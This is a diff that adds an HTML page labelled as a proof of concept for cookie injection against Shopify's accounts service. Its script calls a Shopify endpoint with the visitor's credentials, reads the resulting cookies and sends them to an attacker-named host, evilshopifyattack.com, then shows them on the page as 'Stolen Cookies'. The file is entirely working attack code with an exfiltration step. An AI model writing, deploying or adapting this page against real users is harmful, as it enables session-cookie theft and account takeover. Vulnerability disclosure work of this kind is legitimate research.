@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Shopify Cookie Injection PoC</h1>
+<script>
+(async () => {
+    // Step 1 — Trigger the vulnerable endpoint
+    await fetch("https://accounts.shopify.com/.well-known/dux", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            multiTrackToken: "test",
+            sessionToken: "test",
+            enableActiveConsent: false,
+            enableProtoEventForwarding: false,
+            events: []
+        })
+    });
+
+    // Step 2 — Read cookies that Shopify just set for your domain
+    const stolenCookies = document.cookie;
+
+    // Step 3 — Send them to your server for capture
+    fetch("https://evilshopifyattack.com/log?cookies=" + encodeURIComponent(stolenCookies));
+
+    // Step 4 — Display cookies locally for PoC
+    document.body.innerHTML = "<h2>Stolen Cookies:</h2><pre>" + stolenCookies + "</pre>";
+})();
+</script>
+</body>
+</html>
